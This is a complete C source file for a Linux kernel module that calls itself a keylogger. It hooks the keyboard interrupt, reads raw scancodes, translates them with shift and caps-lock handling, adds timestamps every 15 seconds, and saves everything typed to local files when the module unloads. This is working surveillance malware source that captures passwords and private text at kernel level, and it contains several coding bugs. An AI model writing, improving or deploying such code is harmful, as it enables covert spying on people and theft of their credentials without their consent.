#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/mutex.h>
//#include <sharedVariable.h>

#include <linux/hrtimer.h>
#include <linux/sched.h>

#ifndef __KERNEL__
#define __KERNEL__
#endif

// keyboard constants/variables
#define KBD_INPUT_PORT	0x60    // address of keyboard input buffer
int shiftPressed = 0;
int capsLockEnabled = 0;
#define NORMAL_MODE 0
#define SHIFT_MODE 1
#define CAPS_LOCK_MODE 2
#define SHIFT_CAPS_LOCK_MODE 3
#define NUMBER_OF_MODES 3
unsigned char previousScancode = 0;

// some hard-coded keyboard character hex codes
#define LEFT_SHIFT 0x2a
#define RIGHT_SHIFT 0x36
#define LEFT_SHIFT_RELEASE 0xaa
#define RIGHT_SHIFT_RELEASE 0xb6
#define CAPS_LOCK 0x3a
#define SPACE 0x39
#define ENTER 0x1c
#define BACKSPACE 0x0e

// output file constants/variables
#define OUTPUT_MODE 0644
const char* raw_path = "./raw_output.txt";
const char* simple_path = "./simple_output.txt"; // doesn't include keys such as CAPSLOCK or SHIFT in the output file
struct file *raw_outfile;
struct file *simple_outfile;
int count = 0;
//char* path;

// character buffer variables
#define B_SIZE 1000
char* raw_char_buffer[B_SIZE];
char* simple_char_buffer[B_SIZE];
int raw_pos = 0;
int simple_pos = 0;
int rollover = 0;
struct mutex buffer_mutex; // used whenever the character buffer is modified

// timer and timestamp variables
static struct hrtimer ts_timer;
static ktime_t ts_period;
#define TS_TIMER_PERIOD 15
#define TS_SIZE 10
char timestamp[TS_SIZE];

// FUNCTION PROTOTYPES
struct file *create_file(const char *path);
int write_to_file(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
void close_file(struct file *file);
static irqreturn_t get_scancode(int irq, void *id);
void scancode_to_key(char scancode);
int get_mode_index(char scancode);
void write_to_simple_buffer(char scancode, char* key);
void check_shift_and_caps(unsigned char scancode);
void write_buffer_to_output(void);
void generate_timestamp(void);
static void initialize_timers(void);
static enum hrtimer_restart print_timestamp(struct hrtimer * timer);
static void remove_timers(void);
int get_timestamp_index(char c);

//Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
/* For the 2nd index: 	index = 0, no special keys enabled
			index = 1, only shift enabled
			index = 2, only caps lock enabled
*/
char *scancodes[][NUMBER_OF_MODES] = {
	{"\\0", "\\0", "\\0"},		{"ESC", "ESC", "ESC"},		{"1", "!", "1"}, 
	{"2", "@", "2"}, 		{"3", "#", "3"}, 		{"4", "$", "4"}, 
	{"5", "%", "5"}, 		{"6", "^", "6"}, 		{"7", "&", "7"}, 
	{"8", "*", "8"}, 		{"9", "(", "9"}, 		{"0", ")", "0"}, 
	{"-","_", "-"}, 		{"=", "+", "="}, 		{"BKSP", "BKSP", "BKSP"}, 
	{"\t", "\t", "\t"}, 		{"q", "Q", "Q"}, 		{"w", "W", "W"},
	{"e", "E", "E"}, 		{"r","R", "R"}, 		{"t", "T", "T"}, 
	{"y", "Y", "Y"}, 		{"u", "U", "U"}, 		{"i","I", "I"}, 
	{"o", "O", "O"},		{"p", "P", "P"},		{"[", "{", "["}, 
	{"]", "}", "]"}, 		{"\\n", "\\n", "\\n"}, 		{"CTRL", "CTRL", "CTRL"}, 
	{"a", "A", "A"}, 		{"s", "S", "S"}, 		{"d", "D", "D"}, 
	{"f", "F", "F"}, 		{"g", "G", "G"}, 		{"h", "H", "H"}, 
	{"j", "J", "J"}, 		{"k", "K", "K"}, 		{"l", "L", "L"}, 
	{";", ":", ";"}, 		{"\'", "\"", "\'"}, 		{"`", "~", "`"},
	{"LSHFT","LSHFT","LSHFT"},	{"\\", "|", "\\"}, 
	{"z", "Z", "Z"}, 		{"x", "X", "X"}, 		{"c", "C", "C"}, 
	{"v", "V", "V"}, 		{"b", "B", "B"}, 		{"n", "N", "N"},
	{"m", "M", "M"}, 		{",", "<", ","}, 		{".", ">", "."},
	{"/", "?", "/"},		{"RSHIFT", "RSHIFT", "RSHIFT"},
	{"*", "*", "*"},		{"ALT", "ALT", "ALT"}, 
	{" ", " ", " "}, 		{"CAPSLOCK", "CAPSLOCK", "CAPSLOCK"}, 
	{"F1", "F1", "F1"}, 		{"F2", "F2", "F2"}, 		{"F3", "F3", "F3"}, 
	{"F4", "F4", "F4"}, 		{"F5", "F5", "F5"}, 		{"F6", "F6", "F6"},
	{"F7", "F7", "F7"}, 		{"F8", "F8", "F8"}, 		{"F9", "F9", "F9"},
	{"F10", "F10", "F10"}, 		{"NUMLOCK", "NUMLOCK", "NUMLOCK"}, 
	{"ScrlLck", "ScrlLck", "ScrlLck"}, 				{"Keypad-7", "Keypad-7", "Keypad-7"}, 
	{"Keypad-8", "Keypad-8", "Keypad-8"}, 				{"Keypad-9", "Keypad-9", "Keypad-9"}, 
	{"-", "-", "-"},						{"Keypad-4", "Left", "Keypad-4"},
	{"Keypad-5", "Keypad-5", "Keypad-5"},				{"Keypad-6", "Keypad-6", "Keypad-6"},
	{"+", "+", "+"}, 						{"Keypad-1", "Keypad-1", "Keypad-1"}, 
	{"Keypad-2", "Keypad-2", "Keypad-2"}, 				{"Keypad-3", "Keypad-3", "Keypad-3"},
	{"Keypad-0", "Keypad-0", "Keypad-0"}, 				{"Keypad-.", "Del", "Keypad-."}, 
	{"\0", "\0", "\0"}, 		{"\0", "\0", "\0"}, 		{"\0", "\0", "\0"}, 	
	{"F11", "F11", "F11"}, 		{"F12", "F12", "F12"} };                              

// Create the output file
struct file *create_file(const char *path) 
{
    struct file *fileP = NULL;
    mm_segment_t oldFileSpace;
    int err = 0;

    oldFileSpace = get_fs();
    set_fs(get_ds());
    fileP = filp_open(path, O_CREAT | O_APPEND | O_WRONLY, OUTPUT_MODE);
    set_fs(oldFileSpace);
    if (IS_ERR(fileP)) {
        err = PTR_ERR(fileP);
        return NULL;
    }
    return fileP;
}

// Write to the output file
int write_to_file(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldFileSpace;
    int ret;

    oldFileSpace = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldFileSpace);
    return ret;
}

// Close the output file
void close_file(struct file *file) 
{
    filp_close(file, NULL);
}

// gets the scancode of each pressed key
static irqreturn_t get_scancode(int irq, void *id)
{
	unsigned char scancode;
	scancode = inb(KBD_INPUT_PORT);
	check_shift_and_caps(scancode);
	scancode_to_key(scancode);
	return IRQ_HANDLED;
}

// converts a scancode to the appropriate key in the scancodes array
void scancode_to_key(char scancode)
{
	char* key;
	if (scancodes[scancode][0] != '\0')
	{
		mutex_lock(&buffer_mutex);

		if (capsLockEnabled == 1 && shiftPressed == 0) // only caps lock enabled
		{
			printk("%s\n", scancodes[scancode][CAPS_LOCK_MODE]);
			raw_char_buffer[raw_pos] = scancodes[scancode][CAPS_LOCK_MODE];
			key = scancodes[scancode][CAPS_LOCK_MODE];
		}

		else if (capsLockEnabled == 1 && shiftPressed == 1) // both caps lock and shift enabled
		{
			int mode = get_mode_index(scancode);
			printk("%s\n", scancodes[scancode][mode]);
			raw_char_buffer[raw_pos] = scancodes[scancode][mode];
			key = scancodes[scancode][mode];
		}

		else if (capsLockEnabled == 0 && shiftPressed == 1) // only shift enabled
		{
			printk("%s\n", scancodes[scancode][SHIFT_MODE]);
			raw_char_buffer[raw_pos] = scancodes[scancode][SHIFT_MODE];
			key = scancodes[scancode][SHIFT_MODE];
		}

		else // neither caps lock or shift enabled
		{
			printk("%s\n", scancodes[scancode][NORMAL_MODE]);
			raw_char_buffer[raw_pos] = scancodes[scancode][NORMAL_MODE];
			key = scancodes[scancode][NORMAL_MODE];
		}

		raw_pos++;

		if (raw_pos >= B_SIZE) 
		{
			raw_pos = 0;
			rollover++;
		}

		write_to_simple_buffer(scancode, key);

		mutex_unlock(&buffer_mutex);
	}
}

// gets the mode index for the scancodes array when both shift and caps lock are enabled
int get_mode_index(char scancode)
{
	int index;
	int q_hex = 0x10; // q to p on keyboard
	int p_hex = 0x19;
	int a_hex = 0x1e; // a to l on keyboard
	int l_hex = 0x26;
	int z_hex = 0x2c; // z to m on keyboard
	int m_hex = 0x32;
	
	if (	(scancode >= q_hex && scancode <= p_hex) ||
		(scancode >= a_hex && scancode <= l_hex) ||
		(scancode >= z_hex && scancode <= m_hex))
	{
		index = NORMAL_MODE;
	}
	else
	{
		index = SHIFT_MODE;
	}

	return index;
}

// places character into simple buffer if it is an accepted character
void write_to_simple_buffer(char scancode, char* key)
{
	int range1_min = 0x02; // 1 to =
	int range1_max = 0x0d;

	int range2_min = 0x0f; // q to \n
	int range2_max = 0x1c;
	
	int range3_min = 0x1e; // a to ~
	int range3_max = 0x29;

	int range4_min = 0x2b; // \ to /
	int range4_max = 0x35;

	if ((scancode >= range1_min && scancode <= range1_max) ||
		(scancode >= range2_min && scancode <= range2_max) ||
		(scancode >= range3_min && scancode <= range3_max) ||
		(scancode >= range4_min && scancode <= range4_max) ||
		scancode == SPACE || scancode == BACKSPACE)
	{
		if (scancode == ENTER)
		{
			simple_char_buffer[simple_pos] = "\n";
			simple_pos++;
		}

		else if (scancode == BACKSPACE)
		{
			simple_pos--;
			simple_char_buffer[simple_pos] = "\0";
		}

		else
		{
			simple_char_buffer[simple_pos] = key;
			simple_pos++;
		}
	}
}


// checks if shift or caps lock were pressed
void check_shift_and_caps(unsigned char scancode)
{	
	if (scancode == LEFT_SHIFT || scancode == RIGHT_SHIFT)
	{
		printk("Shift now enabled.");
		shiftPressed = 1;
	}

	if (scancode == LEFT_SHIFT_RELEASE || scancode == RIGHT_SHIFT_RELEASE)
	{
		printk("Shift now disabled.");
		shiftPressed = 0;
	}

	if (scancode == CAPS_LOCK && capsLockEnabled == 0)
	{
		if (previousScancode != CAPS_LOCK) {
			printk("Caps Lock now enabled.");
			capsLockEnabled = 1;
		}
	}

	else if (scancode == CAPS_LOCK && capsLockEnabled == 1)
	{
		if (previousScancode != CAPS_LOCK) {
			printk("Caps Lock now disabled.");
			capsLockEnabled = 0;
		}
	}

	previousScancode = scancode;
}

// writes all the characters stored in the buffer to the output file
void write_buffer_to_output(void)
{
	int i = 0;
	int max_size = B_SIZE;
	char* display_count = "Words this program captured: ";
 
	if (rollover == 0)
	{
		max_size = raw_pos;
	}

	// write raw buffer to output
	while (i < max_size)
	{
		write_to_file(raw_outfile, 0, raw_char_buffer[i], strlen(raw_char_buffer[i]));
		if(raw_char_buffer[i]  == " ") {
		  count++;
		}
		i++;
	}

	// write simple buffer to output
	i = 0;
	while (i < simple_pos)
	{
		write_to_file(simple_outfile, 0, simple_char_buffer[i], strlen(simple_char_buffer[i]));
		i++;
	}
	
	display_count += count;
	write_to_file(raw_outfile, 0, display_count, 1);
	printk("Character buffers written to output.\n");
	printk("Raw character buffer written to %s.\n", raw_path);
	printk("Simple character buffer written to %s.\n", simple_path);
}

// generates a timestamp string in the form [hh:mm:ss]
void generate_timestamp(void)
{
	long total_sec;
	int hr, min, sec;
	struct timeval time;

	do_gettimeofday(&time);
	total_sec = time.tv_sec;

	sec = total_sec % 60;
	min = (total_sec / 60) % 60;
	hr = (((total_sec / 3600) % 24) - 5); // -5 for EST time zone

	// build timestamp string
	sprintf(timestamp, "[%02d:%02d:%02d]", hr, min, sec);
	printk("Time: %s", timestamp);
}

// initializes all timers used by the kernel module
static void initialize_timers(void)
{
	// timestamp timer
	ts_period = ktime_set(TS_TIMER_PERIOD, 0);
	hrtimer_init(&ts_timer, CLOCK_REALTIME, HRTIMER_MODE_REL);
	ts_timer.function = print_timestamp;
	hrtimer_start(&ts_timer, ts_period, HRTIMER_MODE_REL);
}

// adds a timestamp to the output files every 15 seconds and restarts the timestamp timer 
static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
{
	char code;
	mutex_lock(&buffer_mutex);
	generate_timestamp();

	code = timestamp[0];
	raw_char_buffer[raw_pos] = scancodes[get_timestamp_index(code)][0];
	simple_char_buffer[simple_pos] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[1];
	raw_char_buffer[raw_pos+1] = scancodes[get_timestamp_index(code)][0];
	simple_char_buffer[simple_pos+1] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[2];
	raw_char_buffer[raw_pos+2] = scancodes[get_timestamp_index(code)][0];
	simple_char_buffer[simple_pos+2] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[3];
	raw_char_buffer[raw_pos+3] = scancodes[get_timestamp_index(code)][1];
	simple_char_buffer[simple_pos+3] = scancodes[get_timestamp_index(code)][1];
	code = timestamp[4];
	raw_char_buffer[raw_pos+4] = scancodes[get_timestamp_index(code)][0];
	simple_char_buffer[simple_pos+4] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[5];
	raw_char_buffer[raw_pos+5] = scancodes[get_timestamp_index(code)][0];
	simple_char_buffer[simple_pos+5] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[6];
	raw_char_buffer[raw_pos+6] = scancodes[get_timestamp_index(code)][1];
	simple_char_buffer[simple_pos+6] = scancodes[get_timestamp_index(code)][1];
	code = timestamp[7];
	raw_char_buffer[raw_pos+7] = scancodes[get_timestamp_index(code)][0];
	simple_char_buffer[simple_pos+7] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[8];
	raw_char_buffer[raw_pos+8] = scancodes[get_timestamp_index(code)][0];
	simple_char_buffer[simple_pos+8] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[9];
	raw_char_buffer[raw_pos+9] = scancodes[get_timestamp_index(code)][0];
	simple_char_buffer[simple_pos+9] = scancodes[get_timestamp_index(code)][0];

	raw_pos = raw_pos + TS_SIZE;
	simple_pos = simple_pos + TS_SIZE;

	mutex_unlock(&buffer_mutex);

	hrtimer_forward_now(timer, ts_period);
	return HRTIMER_RESTART;
}

// removes all timers from memory when the kernel module is exited
static void remove_timers(void)
{
    hrtimer_cancel(&ts_timer);
}

// finds the array index for each character associated with a timestamp
int get_timestamp_index(char c)
{
	int index = 0;
	switch(c)
	{
		case '[':
			index = 0x1a;
			break;
		case ']':
			index = 0x1b;
			break;
		case ':':
			index = 0x27;
			break;
		case '0':
			index = 0x0b;
			break;
		case '1':
			index = 0x02;
			break;
		case '2':
			index = 0x03;
			break;
		case '3':
			index = 0x04;
			break;
		case '4':
			index = 0x05;
			break;
		case '5':
			index = 0x06;
			break;
		case '6':
			index = 0x07;
			break;
		case '7':
			index = 0x08;
			break;
		case '8':
			index = 0x09;
			break;
		case '9':
			index = 0x0a;
			break;
	}

	return index;
}
  
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A kernel-based keylogger module");

int __init init_keylogger(void)
{
	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
	mutex_init(&buffer_mutex);
	raw_outfile = create_file(raw_path);
	simple_outfile = create_file(simple_path);
	generate_timestamp();
	initialize_timers();
	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
	return 0;
}

void __exit exit_module(void)
{
	printk(KERN_INFO "Exiting keylogger kernel module.\n");
	free_irq(1, (void *)get_scancode);
	write_buffer_to_output();
	close_file(raw_outfile);
	close_file(simple_outfile);
	remove_timers();	
	return;
}

module_init(init_keylogger);
module_exit(exit_module);
